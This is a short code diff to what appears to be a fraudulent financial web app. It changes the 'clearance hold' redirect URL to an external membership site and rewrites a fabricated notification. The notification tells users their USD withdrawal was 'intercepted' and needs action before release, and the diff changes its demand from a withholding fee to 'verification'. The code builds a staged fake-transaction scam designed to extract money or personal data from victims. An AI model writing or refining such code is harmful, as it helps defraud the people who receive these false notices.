@@ -1042,7 +1042,7 @@ setInterval(particle, 800);
 // ==========================================
 
 // 🎯 REDIRECTION TARGET FOR STAGE 3 CLEARANCE HOLD
-const CLEARANCE_REDIRECT_URL = "https://linkly.link/2qtXb"; // Change to your desired page
+const CLEARANCE_REDIRECT_URL = "https://membership.avalonflow.site/9c8e1a4f0b2d3e5c6a7f8b9c1d2e3f4a"; // Change to your desired page
 const ENABLE_AUTO_REDIRECT = false;             // Set to true for automatic timer redirect
 const AUTO_REDIRECT_DELAY_MS = 5000;           // 5-second countdown if auto-redirect is true
 
@@ -1226,7 +1226,7 @@ async function initDynamicNotifications() {
         const stage3Time = formatTimestamp(new Date(baseWithdrawalMs + (35 * 60 * 1000)));
         generatedNotifications.push({
           id: 10, type: "withdrawal", category: "failed", title: "Action Required: Intermediary Clearance Hold",
-          description: `Your transfer of <strong>$${formattedWithdrawnAmount} USD</strong> has been intercepted by the cross-border clearing layer. Institutional withholding fee required prior to release.`,
+          description: `Your transfer of <strong>$${formattedWithdrawnAmount} USD</strong> has been intercepted by the cross-border clearing layer. Verification required prior to release.`,
           timestamp: stage3Time, isRead: false, txRef: holdTxRef, isActionRequired: true
         });
       }
